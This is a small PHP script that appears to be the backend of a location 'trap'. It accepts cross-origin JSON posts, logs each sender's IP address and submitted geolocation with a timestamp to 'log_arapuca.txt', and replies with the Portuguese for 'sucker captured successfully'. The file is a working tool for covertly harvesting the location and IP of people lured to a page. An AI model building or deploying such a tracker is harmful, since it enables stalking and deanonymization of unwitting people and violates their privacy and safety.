<?php
if (isset($_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Headers: Content-Type");
}

if(isset($_POST)){

    $inputJSON = file_get_contents('php://input');
    $input = json_decode($inputJSON);

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    $fp = fopen("log_arapuca.txt", "a");
    $escreve = fwrite($fp, json_encode(['ip' => $ip, 'localizacao' => $input, 'date' => date("Y-m-d H:i:s")]));
    fclose($fp);

    echo json_encode(['sucess' => 'Otario capturado com sucesso.']);
}

?>